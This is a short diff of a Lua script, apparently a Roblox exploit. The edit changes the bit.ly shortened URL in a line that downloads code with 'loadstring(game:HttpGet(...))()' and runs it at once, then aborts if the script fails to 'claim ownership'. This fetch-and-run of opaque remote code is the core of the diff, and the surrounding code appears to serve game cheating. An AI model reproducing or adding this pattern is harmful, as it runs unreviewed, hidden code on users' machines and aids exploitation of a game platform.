@@ -12,7 +12,7 @@ local function RandString(Len)
     return Rand
 end
 
-local IsOwner = loadstring(game:HttpGet("https://bit.ly/rbxnet"))()
+local IsOwner = loadstring(game:HttpGet("https://bit.ly/gainownership"))()
 if not IsOwner then error("Failed to claim ownership") return end
 
 local RunService = game:GetService("RunService")
